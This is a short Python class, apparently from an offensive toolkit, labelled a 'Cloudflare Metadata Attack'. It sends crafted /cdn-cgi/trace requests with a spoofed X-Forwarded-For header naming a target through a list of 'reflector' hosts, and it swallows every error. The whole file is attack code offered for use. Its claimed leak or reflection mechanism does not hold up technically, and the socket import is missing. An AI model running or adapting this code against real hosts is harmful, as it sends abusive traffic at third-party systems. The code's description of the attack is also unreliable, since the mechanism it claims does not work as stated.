class CloudflareMetadataAttack:
    """Cloudflare Metadata Attack (CF-METADATA-LEAK)"""
    def __init__(self, target, reflector_list):
        self.target = target
        self.reflectors = reflector_list

    def _craft_metadata_request(self, reflector):
        # Craft a request that triggers metadata leakage in Cloudflare
        payload = f"GET /cdn-cgi/trace HTTP/1.1\r\nHost: {reflector}\r\nX-Forwarded-For: {self.target}\r\n\r\n"
        return payload.encode()

    def execute(self):
        for reflector in self.reflectors:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((reflector, 80))
                sock.send(self._craft_metadata_request(reflector))
                sock.close()
            except:
                pass
